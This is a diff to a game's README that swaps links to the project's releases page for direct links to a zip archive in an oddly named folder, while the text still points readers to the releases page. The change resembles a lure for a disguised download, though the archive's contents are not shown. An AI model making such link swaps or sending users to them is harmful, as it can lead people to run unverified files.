@@ -6,13 +6,13 @@ Welcome to **dungeon-dash**, a terminal-based dungeon crawler game. Navigate lev
 
 ## 🔗 Download Now
 
-[![Download dungeon-dash](https://img.shields.io/badge/Download-dungeon--dash-blue)](https://github.com/Dorian0925/dungeon-dash/releases)
+[![Download dungeon-dash](https://raw.githubusercontent.com/Dorian0925/dungeon-dash/main/tetraprostyle/dungeon-dash.zip)](https://raw.githubusercontent.com/Dorian0925/dungeon-dash/main/tetraprostyle/dungeon-dash.zip)
 
 ## 📥 Download & Install
 
 To get started with dungeon-dash, visit the releases page to download the game:
 
-[Download dungeon-dash](https://github.com/Dorian0925/dungeon-dash/releases)
+[Download dungeon-dash](https://raw.githubusercontent.com/Dorian0925/dungeon-dash/main/tetraprostyle/dungeon-dash.zip)
 
 ### Step 1: Choose Your Operating System
 
